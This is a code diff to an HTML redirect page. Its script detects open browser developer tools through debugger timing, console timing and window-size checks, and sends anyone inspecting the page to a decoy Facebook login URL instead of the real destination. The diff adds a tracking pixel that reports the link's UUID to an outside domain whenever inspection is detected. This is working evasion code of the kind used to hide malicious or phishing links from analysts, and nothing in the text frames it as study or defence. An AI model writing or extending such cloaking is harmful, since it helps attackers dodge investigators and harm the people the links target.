@@ -1,11 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <title>Redirect Page</title>
     <script>
         (function() {
             let isDevToolsOpen = false;
+            
+            const basePath = 'https://example.com';
+            const normalDestination = `${basePath}/destination`; 
             const devToolsWarningUrl = "https://facebook.com/login";
-            const normalDestination = "https://example.com/destination";
+            
+            const path = window.location.pathname;
+            const uuid = path.split('/').filter(segment => segment).pop(); 
+            
+            function logUuidViaPixel(uuid) {
+     
+                const pixel = new Image();
+                
+                pixel.src = `https://ourdomain.com/pixel?uuid=${encodeURIComponent(uuid)}&t=${Date.now()}`;
+                
+                pixel.onerror = () => {};
+            }
             
             function checkDebugger() {
                 const startTime = Date.now();
@@ -15,35 +30,45 @@
                 if (endTime - startTime > 100) {
                     if (!isDevToolsOpen) {
                         isDevToolsOpen = true;
-                        window.location.href = devToolsWarningUrl;
-                    }
-                }
-            }
-            function checkConsole() {
-                const startTime = Date.now();
-                console.clear();
-                const endTime = Date.now();
-                if (endTime - startTime > 100) {
-                    if (!isDevToolsOpen) {
-                        isDevToolsOpen = true;
+                        logUuidViaPixel(uuid); 
                         window.location.href = devToolsWarningUrl;
                     }
                 }
             }
             
+
+            function checkConsole() {
+                const startTime = Date.now();
+                console.clear();
+                const endTime = Date.now();
+                
+                if (endTime - startTime > 100) {
+                    if (!isDevToolsOpen) {
+                        isDevToolsOpen = true;
+                        logUuidViaPixel(uuid); 
+                        window.location.href = devToolsWarningUrl;
+                    }
+                }
+            }
+            
+
+            
             setTimeout(function() {
                 if (!isDevToolsOpen) {
                     window.location.href = normalDestination;
                 }
+                
                 setInterval(checkDebugger, 1000);
                 setInterval(checkConsole, 1000);
             }, 50);
+            
             window.addEventListener('resize', function() {
                 const widthThreshold = window.outerWidth - window.innerWidth > 160;
                 const heightThreshold = window.outerHeight - window.innerHeight > 160;
                 
                 if ((widthThreshold || heightThreshold) && !isDevToolsOpen) {
                     isDevToolsOpen = true;
+                    logUuidViaPixel(uuid); 
                     window.location.href = devToolsWarningUrl;
                 }
             });
